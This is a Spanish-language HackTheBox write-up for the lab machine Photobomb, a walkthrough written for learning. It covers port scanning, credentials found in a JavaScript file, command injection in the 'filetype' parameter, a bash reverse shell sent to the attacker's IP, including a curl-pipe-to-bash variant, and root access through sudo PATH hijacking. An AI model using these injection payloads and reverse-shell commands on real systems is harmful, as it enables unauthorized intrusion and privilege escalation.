---
title: Photobomb
published: 2024-05-11
description: 'Writeup de la maquina Photobomb de HackTheBox'
image: ''
tags: [nmap,command injection,path hijacking]
category: 'HackTheBox'
draft: false 
---

# Descripción
* **Nivel:** Fácil.
* **Temas a tratar:** Enumeracion, command injection, path hijacking. 
* **OS:** Linux.
* **Plataforma:** HackTheBox.
* **Fecha de retiro:** 11/02/2023.
* **IP atacante:** 10.10.14.6
* **IP victima:** 10.10.11.182
___
## Enumeración
Empezamos enumerando los puertos bajo el protocolo TCP abiertos con nmap.
```bash
sudo nmap -p- -sS 10.10.11.182 -Pn -n --min-rate 6000 -vvv -oG allports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 21:18 CST
Initiating SYN Stealth Scan at 21:18
Scanning 10.10.11.182 [65535 ports]
Discovered open port 22/tcp on 10.10.11.182
Discovered open port 80/tcp on 10.10.11.182
Completed SYN Stealth Scan at 21:19, 44.26s elapsed (65535 total ports)
Nmap scan report for 10.10.11.182
Host is up, received user-set (0.079s latency).
Scanned at 2024-05-10 21:18:52 CST for 44s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 44.43 seconds
           Raw packets sent: 65752 (2.893MB) | Rcvd: 65651 (2.626MB)
```
*En mi caso por alguna extraña razón HackTheBox me da problemas utilizando un min-rate de 5000, así  que opto por utilizarlo en 6000 para evitar este problema*

Puertos encontrados:
`22: Referente a una conexión ssh`
`80: Referente a un sitio web`

Una vez teniendo los puertos realicemos otro análisis pero para estos puertos en especifico.
*Podríamos también  realizar un análisis a los puertos utilizados bajo el protocolo UDP pero adelanto que al descubrir 2 que nos pueden llegar a ser de utilidad optamos por no realizarlo*
```bash
sudo nmap -p22,80 -sV -sC 10.10.11.182 -vvv -oN ports 
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
|   256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Muy bien, en el puerto *22* no logro notar algo interesante o una versión que nos permita enumerar usuarios, así que optemos por visitar la el sitio web que se encuentra en el puerto *80*, podemos ver que escaneo de nmap redirecciona al sitio *photobomb.htb* así que para poder tener acceso agreguemos esta dirección dentro del */etc/hosts*
`10.10.11.182    photobomb.htb`
Una vez agregada, accedamos a ella por medio del navegador:
![Index](Index.png)
A simple vista pues podemos ver que hay un link existente, y si entramos a el nos muestra una pestaña de login... 
![Login](Login.png)
De momento no tenemos algún usuario o contraseña para realizar una fuerza bruta. Así que ahora empecemos a explorar el código fuente de sitio a ver si encontramos en algún comentario algún usuario y contraseña.
![Codigo Fuente](Source-code.png)
Y encontramos algo interesante en el *head* de la pagina *photobomb.js*  veamos su contenido.
```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
pH0t0:b0Mb!pH0t0:b0Mb!... Bingo!!
Usuario:Contraseña.
Probemos con estas credenciales a ver si tenemos acceso, si no lo tenemos pues intentemos realizando fuerza bruta con *Hydra* (spoiler, no se requiere).
![Interfaz de Print](print-photo.png)
Y bueno ahora tenemos acceso al sitio, veamos como se comporta este sitio, y bueno solo nos descarga las imágenes con el formato que elegimos y la resolución que pidamos. Probemos con *exiftool* para ver que información obtenemos de una de estas imágenes:
```bash
exiftool wolfgang-hasselmann-RLEgmd1O7gs-unsplash_1000x1500.png
....
File Name                       : wolfgang-hasselmann-RLEgmd1O7gs-unsplash_1000x1500.png
Directory                       : .
File Size                       : 730 kB
File Modification Date/Time     : 2024:04:28 16:38:17-06:00
File Access Date/Time           : 2024:05:09 22:00:05-06:00
File Inode Change Date/Time     : 2024:04:28 16:38:17-06:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1000
Image Height                    : 667
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : icc
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
....
```
Vemos algo relacionado con Little CMS pero la versión no se encuentra alguna vulnerabilidad así que descartamos esto.
## Probando Command Injection
Probemos utilizando *burpsuite* capturando la petición a ver si esto es vulnerable a un *command injection*.
``` http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg&dimensions=600x400
```

Bueno podemos encontrar que hay 3 campos que podemos manipular, probando con cada uno de ellos encontramos utilizando el formato básico de *;sleep 5* pero haciéndole un url encode *;sleep+5* (esperando a que el sitio se tarde mas de 5 segundos en regresarnos la petición) notamos que el que reacciona con esto es el parámetro *filetype*, ya que se tardo un total de *8,034* milisegundos en regresar la petición.
![Burpsuite Time](Burpsuite.png)
*Si alguno de estos no llegara a funcionar modificaría alguno otro de la siguiente lista, hasta corroborar que ninguno de estos funciona*  [Command Injection Payload List](https://github.com/payloadbox/command-injection-payload-list)
Este command injection desgraciadamente no nos da un output, pero probemos ejecutar enviar una traza *ICMP* (Internet Control Message Protocol) o en otras palabras realizar un *ping* de la maquina victima hacia nosotros (nuestra IP es la *10.10.14.6*):
*Recordar que nosotros tenemos que esperar una traza ICMP con la herramienta tcpdump por el puerto de red tun0 que es el puerto que nos otorga la VPN de HackTheBox*
#### Maquina atacante (nosotros)
```bash
sudo tcpdump -i tun0 icmp
```
#### Burpsuite
```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg;ping+-c+1+10.10.14.6&dimensions=600x400
```
#### Resultado
```bash
19:03:35.557689 IP photobomb.htb > 10.10.14.6: ICMP echo request, id 5, seq 1, length 64
19:03:35.557716 IP 10.10.14.6 > photobomb.htb: ICMP echo reply, id 5, seq 1, length 64
```
## Shell
Bueno tenemos la traza, así que ahora enviémonos una reverse shell, aquí hay varias maneras de realizar esto,  podemos generar un archivo *.sh* dentro de nuestra maquina y con *curl* generar una ejecución (curl IP/revshell.sh | bash), o la clásica y la que voy a usar es inyectarlo desde la misma petición solamente realizando un *url-encode* para que la pueda ejecutar:
#### Comando a utilizar
``` bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1' 
```
En mi caso voy a utilizar el puerto 9001.
#### Petición final en Burpsuite
```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.6/9001+0>%261'&dimensions=600x400
```

Ahora nos colocamos a la escucha con *netcat* por el puerto utilizado (9001).
```bash
nc -lvnp 9001
```
Enviamos la petición con *burpsuite* y esperemos a ver si recibimos la shell.
```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.182] 49854
bash: cannot set terminal process group (702): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ whoami
whoami
wizard
```
Bueno ahora vamos a ajustar la shell a una mas interactiva, para evitar problemas en un futuro. 
*Recomiendo checar el siguiente video por si tienen alguna duda del por que realizar esto.*[0XDF--What Happens In a "Shell Upgrade"?](https://www.youtube.com/watch?v=DqE6DxqJg8Q)
```bash
wizard@photobomb:~/photobomb$ which python3
/usr/bin/python3
wizard@photobomb:~/photobomb$ python3 -c 'import pty; pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ 
# ctrl + z
--zsh: suspended  sudo nc -lvnp 9001

 --╭─fenixia@frieren in ~ as 🧙 took 10m35s
stty raw -echo; fg

--[1]  + continued  sudo nc -lvnp 9001
# Enter 2 veces
wizard@photobomb:~/photobomb$ export TERM=xterm
```
Ahora podemos ir a home y podremos encontrar la *user flag*:
```bash 
wizard@photobomb:~/photobomb$ cd
wizard@photobomb:~$ ls
photobomb  user.txt
```
*Es mejor buscar si existen mas usuarios dentro del /etc/passwd pero el usuario wizard es el único, me brinque esa parte pero puedes corroborar cuantos usuarios tienen /home*

## Escalada de privilegios
Ya con acceso a la maquina vamos a buscar la manera de escalar privilegios dentro de la maquina. Lo primero que siempre hago es verificar la versión del kernel para ver si es vulnerable:
```bash
wizard@photobomb:~$ uname -a
Linux photobomb 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
En este caso no lo es así que ahora veamos a ver si esta algún permiso asociado al usuario que nos permita ejecutar algún comando como *root*.
```bash
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
Bueno ya lo encontramos, podemos ejecutar como *root* el archivo *cleanup.sh* sin necesidad de contraseña, pero hay algo mas *SETENV* preguntándole a ChatGPT para que nos ayude nos dice lo siguiente: 
```
Este es un permiso de sudo que permite al usuario establecer variables de entorno específicas antes de ejecutar el comando.
```
Esto ya me indica que estamos frente a un posible *Path Hijacking*. Pero que es esto.
### Path Hijacking
Es una vulnerabilidad que permite suplantar algún programa o binario desde el PATH colocándolo desde antes en la ruta de directorios en el PATH, esto nos permitiría ejecutar algún código o script como otro usuario o llegar a tener una Shell interactiva.
![Path Hijacking](Path-hijacking.png)
#### Sanitizar un Path Hijacking
Para evitar esta vulnerabilidad se opta por realizar llamadas de binarios de forma absoluta, en otras palabas en lugar de llamar dentro de algún script o programa el binario *cat* de forma relativa (en palabras simples solamente colocando el nombre del binario) utilizamos su ruta absoluta que por ejemplo puede ser */usr/bin/cat*.
*Obviamente hay que tomar en cuenta que hay que evitar que puedan modificar estos binarios o los directorios en los cuales se encuentran.*
## Explotación
Primero que nada vamos a ver si nuestra teoria es cierta viendo que contiene el script *cleanup.sh* 
```bash
wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
Y lo encontramos, la mayoría de este script esta bien menos la parte final *find*, así que  generamos un archivo con este mismo nombre en otra ruta, en este caso utilizare la ruta */tmp* pero que su contenido nos otorgue una *bash* interactiva (esto con el paramento *-i*).
```bash
wizard@photobomb:~$ cd /tmp
wizard@photobomb:/tmp$ echo "/bin/bash -i" > find
wizard@photobomb:/tmp$ chmod +x find
wizard@photobomb:/tmp$ ls
find
```
Ahora que tenemos todo listo realicemos el *Path Hijacking*, colocando la ruta */tmp* desde antes que el *PATH* normal.
```bash
wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# whoami
root
root@photobomb:/home/wizard/photobomb# cd
root@photobomb:~# ls
root.txt
```

